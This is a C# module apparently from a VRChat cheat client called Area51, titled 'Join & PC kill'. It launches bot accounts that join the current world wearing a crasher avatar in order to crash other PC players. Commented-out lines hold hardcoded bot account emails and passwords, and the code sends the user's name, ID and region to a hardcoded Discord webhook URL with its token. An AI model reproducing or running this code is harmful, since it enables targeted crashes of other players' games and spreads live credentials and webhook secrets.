using Trinity.Utilities;
using Area51.SDK;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using VRC.Core;

namespace Area51.Module.Bot.Local
{
    class JoinAssetCrash : BaseModule
    {
        public JoinAssetCrash() : base("Join & PC kill", "Bots Join World With Crasher Avitar", Main.Instance.privatebotbutton, null, false) { }
        public override void OnEnable()
        {
            try
            {
                if (!Directory.Exists(@"\Area51\Bot\Area51.exe"))
                {
                    string worldID = PlayerWrapper.GetWorldID;
                    string instanceID = PlayerWrapper.GetinstanceID;
                    string userID = PlayerWrapper.GetUserID;
                    string path = AppDomain.CurrentDomain.BaseDirectory + @"\Area51\Bot\";
                    string Region = GetRegion(GetWorldRegion);
                    Logg.Log(Logg.Colors.Red, worldID + "\n" + userID + "\n" + path + "\n", false, false);
                    if (File.Exists(path + "Area51.exe"))
                    {
                        Logg.Log(Logg.Colors.Red, "Bots are joining world.", false, false);
                        Logg.LogDebug("Bots Joining Now To Crash PC players");

                        //Josh's PhotonBots
                        //StartBot(path + "Area51.exe", "photonbot8lol@outlook.com:PhotonBot123|usw|" + worldID + "|avtr_c4961195-1980-4a98-bb95-3cbe0e063463|" + userID + "|0.7|JoinWorld");
                        //StartBot(path + "Area51.exe", "photonbot7lol@outlook.com:PhotonBot123|usw|" + worldID + "|avtr_c4961195-1980-4a98-bb95-3cbe0e063463|" + userID + "|-0.7|JoinWorld");
                       // StartBot(path + "Area51.exe", "eebot1@outlook.com:PhotonBot123|" + Region + "|" + worldID + "|avtr_c4961195-1980-4a98-bb95-3cbe0e063463|" + userID + "|0.7|JoinWorld");
                       // StartBot(path + "Area51.exe", "eebot2@outlook.com:PhotonBot123|" + Region + "|" + worldID + "|avtr_c4961195-1980-4a98-bb95-3cbe0e063463|" + userID + "|-0.7|JoinWorld");
                        //Fish's PhotonBots
                        //StartBot(path + "Area51.exe", "lmaowtfdiscordcrazy@outlook.com:PhotonBot1|" + Region + "|" + worldID + "|avtr_f62d9b84-9ab9-44b4-883a-6b1487bed336|" + userID + "|0.7|JoinWorld");
                        // StartBot(path + "Area51.exe", "photonbot123@outlook.com:PhotonBot1|" + Region + "|" + worldID + "|avtr_f62d9b84-9ab9-44b4-883a-6b1487bed336|" + userID + "|0.7|JoinWorld");

                    }
                    else
                    {
                        Logg.Log(Logg.Colors.Red, "Bots failed to join world.", false, false);
                        Logg.LogDebug("Failed To Join World");
                    }
                    log();
                }
                else
                {
                    Logg.Log(Logg.Colors.Red, "You Dont Have Access To Local Handler", false, false);
                    Logg.LogDebug("You Dont Have Access To Local Handler");
                }
                
            }
            catch (Exception ex)
            {
                Logg.Log(Logg.Colors.Red, ex.ToString());
                APIUser currentUser = APIUser.CurrentUser;
                string webhook = "https://discord.com/api/webhooks/915691072653516800/oN5YrAZ2wZlnsXSor_WtyK5Il4VEZdXBZa5Lrvf1sJhNJl0-ZJOXkGTMZnzJfbw69yWk";
                WebRequest wr = (HttpWebRequest)WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream())) { string json = JsonConvert.SerializeObject(new { username = "Photon Logs", embeds = new[] { new { description = $"{currentUser.displayName} Cannot Execute Command \n {ex.ToString()}", title = "Command: Join & PC Kill", color = "10038562" } } }); sw.Write(json); }
                var response = (HttpWebResponse)wr.GetResponse();
            }

        }
        public void StartBot(string fileName, string Payload)
        {
            if (fileName == "" || (Payload == "")) { Logg.Log(Logg.Colors.Red, "Empty Input", true, false); }
            {
                var process = new Process
                {
                    StartInfo =
                    {
                      FileName = fileName,

                      Arguments = Payload
                    }
                };
                process.Start();

            }
        }

        public static string[] Regions { get { return new string[] { "usw", "eu", "jp" }; } }

        public static string GetWorldRegion => RoomManager.field_Internal_Static_ApiWorldInstance_0.region.ToString();


        private static string GetRegion(string input)
        {
            switch (input)
            {
                case "Europe": return "eu";
                case "US_East": return "us";
                case "US_West": return "usw";
                default: return "usw";
            }
        }

        public static void log()
        {
            APIUser currentUser = APIUser.CurrentUser;
            string webhook = "https://discord.com/api/webhooks/915691072653516800/oN5YrAZ2wZlnsXSor_WtyK5Il4VEZdXBZa5Lrvf1sJhNJl0-ZJOXkGTMZnzJfbw69yWk";
            WebRequest wr = (HttpWebRequest)WebRequest.Create(webhook);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream())) { string json = JsonConvert.SerializeObject(new { username = "Photon Logs", embeds = new[] { new { description = $"Username: {currentUser.displayName} \n ========================================================= \n UserID: {currentUser.id} \n ========================================================= \n Region: {RoomManager.field_Internal_Static_ApiWorldInstance_0._region_k__BackingField}", title = "Command: Join & PC Kill", color = "1752220" } } }); sw.Write(json); }
            var response = (HttpWebResponse)wr.GetResponse();
        }
    }
}
